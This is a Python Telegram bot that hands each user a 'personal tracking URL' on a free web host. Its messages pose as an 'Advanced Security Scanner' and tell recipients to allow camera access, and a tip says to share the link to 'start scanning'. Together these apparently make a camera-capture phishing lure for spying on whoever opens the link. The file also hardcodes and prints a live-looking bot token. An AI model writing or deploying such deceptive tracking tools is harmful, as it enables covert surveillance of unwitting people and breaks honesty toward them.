from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

BOT_TOKEN = "8279598676:AAFwYVtwI2O4F4713fqMyhw1JXXxkpiw_18"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or f"user_{user_id}"
    
    # Your HTML URL with user parameters
    html_url = f"https://topwebzlink.rf.gd/track.html?chat_id={user_id}&user={username}"
    
    message = f"""
🔐 **Advanced Security Scanner**

🌐 **Your Personal Tracking URL:**
{html_url}

📸 **Instructions:**
1. Click the link above
2. Allow camera access when prompted  
3. Wait for system scan to complete

⚠️ **This URL is unique to you. Keep it secure.**

🆔 **Your ID:** `{user_id}`
"""
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
🤖 **Bot Commands:**
/start - Get your personal tracking URL
/help - Show this help message
/stats - Show your user statistics

🔗 **Tracking URL Format:**
https://topwebzlink.rf.gd/track.html?chat_id=YOUR_ID
"""
    await update.message.reply_text(help_text)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "N/A"
    first_name = update.effective_user.first_name or "User"
    
    stats_text = f"""
📊 **Your Statistics:**

👤 **User Info:**
• Name: {first_name}
• Username: @{username}
• User ID: `{user_id}`

🔗 **Your Tracking URL:**
https://topwebzlink.rf.gd/track.html?chat_id={user_id}

💡 **Tip:** Share your tracking URL to start scanning.
"""
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def test_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test command to check if bot is working"""
    await update.message.reply_text("✅ Bot is working perfectly!")

def main():
    try:
        # Create application
        application = Application.builder().token(BOT_TOKEN).build()
        
        # Add handlers
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("help", help_command))
        application.add_handler(CommandHandler("stats", stats_command))
        application.add_handler(CommandHandler("test", test_command))
        
        # Start bot with polling
        print("🤖 Starting Telegram Bot...")
        print("📍 Using Polling Method")
        print("🔑 Bot Token: 8279598676:AAFwYVtwI2O4F4713fqMyhw1JXXxkpiw_18")
        print("⏳ Bot is running. Press Ctrl+C to stop.")
        
        # Get bot info after application is built
        bot_info = application.bot
        print(f"📝 Bot initialized successfully!")
        
        application.run_polling()
        
    except Exception as e:
        print(f"❌ Error: {e}")
        print("💡 Troubleshooting:")
        print("1. Check your internet connection")
        print("2. Verify bot token is correct")
        print("3. Make sure Python is installed")

if __name__ == '__main__':
    main()
